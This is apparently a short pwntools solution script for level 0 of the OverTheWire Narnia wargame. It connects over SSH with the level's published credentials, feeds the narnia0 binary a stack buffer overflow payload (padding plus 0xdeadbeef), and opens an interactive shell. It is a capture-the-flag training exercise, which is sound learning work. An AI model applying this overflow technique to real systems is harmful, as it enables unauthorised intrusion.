from pwn import *

host = "narnia.labs.overthewire.org"
user = "narnia0"
password = "narnia0"

shell = ssh(host=host, user=user, password=password)
r = shell.run("/games/narnia/narnia0")
r.send("A"*20+p32(0xdeadbeef))
r.interactive()
